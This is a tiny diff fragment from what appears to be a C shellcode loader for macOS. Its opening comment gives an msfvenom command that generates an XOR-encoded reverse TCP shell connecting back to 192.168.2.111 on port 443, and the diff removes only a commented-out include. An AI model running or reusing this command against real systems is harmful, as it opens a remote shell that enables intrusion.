@@ -1,6 +1,5 @@
 //msfvenom -p osx/x64/shell_reverse_tcp EXITFUNC=process LHOST=192.168.2.111 LPORT=443 -a x64 --platform OSX -e x64/xor -f c -o test.c
 
-//#include <stdio.h>
 #include <string.h>
 #include <sys/mman.h>
 
